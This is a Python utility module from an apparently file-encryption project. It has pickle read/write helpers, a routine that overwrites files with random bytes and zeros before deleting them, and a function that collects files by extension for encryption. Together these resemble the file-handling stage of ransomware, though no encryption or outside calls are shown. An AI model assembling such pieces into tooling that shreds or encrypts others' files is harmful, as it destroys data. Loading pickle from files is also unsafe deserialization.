import logging
import pickle
import sys
from os import urandom, remove, path, listdir, walk
from random import randint
from core.config import REQUIRED_FILE_FORMAT

logger = logging.getLogger(__name__)


def write_data_to_file(file_path, data, serialized=True):
    """Writes data to file, in some cases serializes objects before writing them to a file

    Args:
        file_path (str): The absolute path of the file to be written
        data (bytes, obj): The data can be bytes or objects
        serialized (bool, optional): Flag to determine whether to serialize objects or write them directly. Defaults to True.
    """
    logger.info(f"Writing data to {file_path}")
    file = open(file_path, "wb")
    if serialized:
        file.write(data)
    else:
        pickle.dump(data, file, pickle.HIGHEST_PROTOCOL)
    file.close()


def read_data_from_file(file_path, serialized=True):
    """Reads data from a file and loads the objects, if present 

    Args:
        file_path (str): The absolute path of the file to read data from
        serialized (bool, optional): Flag to determine if the data needs to be deserialized. Defaults to True.

    Returns:
        byte: Data from the file
    """
    logger.info(f"Reading data from {file_path}")
    file = open(file_path, "rb")
    if serialized:
        file_data = file.read()
    else:
        file_data = pickle.load(file)
    file.close()
    return file_data


def shred_file(file_path):
    """Overwrites original data multiple times before deleting it

    Args:
        file_path (str): The absolute file path to be deleted
    """
    logger.info(f"Shredding file {file_path}")
    with open(file_path, "ab+") as file_to_be_deleted:
        length = file_to_be_deleted.tell()

    with open(file_path, "br+") as file_to_be_deleted:
        for _ in range(randint(3, 7)):
            file_to_be_deleted.seek(0)
            file_to_be_deleted.write(urandom(length))

    with open(file_path, "br+") as file_to_be_deleted:
        for x in range(length):
            file_to_be_deleted.write(b"\x00")

    remove(file_path)


def get_files_to_be_encrypted():
    """Generates the list of files to be encrypted

    Args:
        directory (list): list of all absolute file paths to be encrypted

    Returns:
        [type]: [description]
    """
    if getattr(sys, 'frozen', False):
        application_directory = path.dirname(sys.executable)
    else:
        application_directory = path.dirname(path.abspath(__name__))
        
    logger.info(f"Discovering files in {application_directory}")
    files_to_encrypted = [
        path.join(root,f)
        for root, dir, file in walk(application_directory)
        for f in file
        if path.splitext(f)[1].upper() in REQUIRED_FILE_FORMAT
    ]
    return files_to_encrypted
